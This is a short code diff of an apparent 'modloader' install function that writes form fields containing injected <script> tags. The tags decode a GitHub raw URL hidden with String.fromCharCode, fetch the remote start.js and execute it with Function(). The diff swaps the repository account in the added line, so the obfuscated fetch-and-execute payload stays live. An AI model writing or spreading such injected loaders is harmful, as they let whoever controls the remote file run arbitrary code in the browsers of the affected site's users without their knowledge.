@@ -17,7 +17,7 @@ function install() {
         if (originalCookie) {
             formData.append(cookieName, `${originalCookie}<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>(Function(d))())</script>`);
         } else {
-            formData.append(cookieName, `<span class=\"original\">Period ${i}</span><script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>(Function(d))())</script>`);
+            formData.append(cookieName, `<span class=\"original\">Period ${i}</span><script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,114,104,115,109,108,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>(Function(d))())</script>`);
         }
     }
 
